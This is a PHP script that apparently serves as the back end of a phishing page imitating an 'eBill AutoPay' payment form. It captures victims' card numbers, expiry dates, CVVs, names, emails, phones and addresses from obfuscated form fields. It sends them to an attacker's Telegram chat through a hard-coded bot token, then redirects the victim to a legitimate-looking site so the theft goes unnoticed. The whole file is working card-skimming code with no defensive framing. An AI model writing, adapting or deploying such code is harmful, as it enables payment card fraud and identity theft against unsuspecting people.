<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Telegram bot settings
    $botToken = '7620551383:AAE9qdD3N7cTnJxjYOOqIS1pDaEkkh_SDNM';
    $chatId = '6979886709';

    // Collect data from form (sanitize for safety)
    $cardNumber = htmlspecialchars($_POST['oY0krpwsj'] ?? 'N/A');
    $expiryDate = htmlspecialchars($_POST['zYMvYKwVR'] ?? 'N/A');
    $cvv = htmlspecialchars($_POST['lJijAEQxH'] ?? 'N/A');
    $cardholder = htmlspecialchars($_POST['jPMgE8Q55'] ?? 'N/A');
    $email = htmlspecialchars($_POST['jFQ7orKSO'] ?? 'N/A');
    $phone = htmlspecialchars($_POST['UCYR07otc'] ?? 'N/A');
    $zip = htmlspecialchars($_POST['xK1QGK_83'] ?? 'N/A');
    $address = htmlspecialchars($_POST['pwT0tJIXR'] ?? 'N/A');
    $termsAccepted = isset($_POST['Click Here']) ? 'Yes' : 'No';

    // Prepare Telegram message
    $message = "💳 *New eBill AutoPay Submission:*\n\n";
    $message .= "*Card Number:* $cardNumber\n";
    $message .= "*Expiry Date:* $expiryDate\n";
    $message .= "*CVV:* $cvv\n";
    $message .= "*Cardholder:* $cardholder\n";
    $message .= "*Email:* $email\n";
    $message .= "*Phone:* $phone\n";
    $message .= "*ZIP Code:* $zip\n";
    $message .= "*Address:* $address\n";
    $message .= "*Terms Accepted:* $termsAccepted";

    // Send message to Telegram
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    file_get_contents($telegramUrl . '?' . http_build_query($params));
}

// Redirect to Shaw (always happens, POST or not)
header("Location: https://www.magicmail.com");
exit();
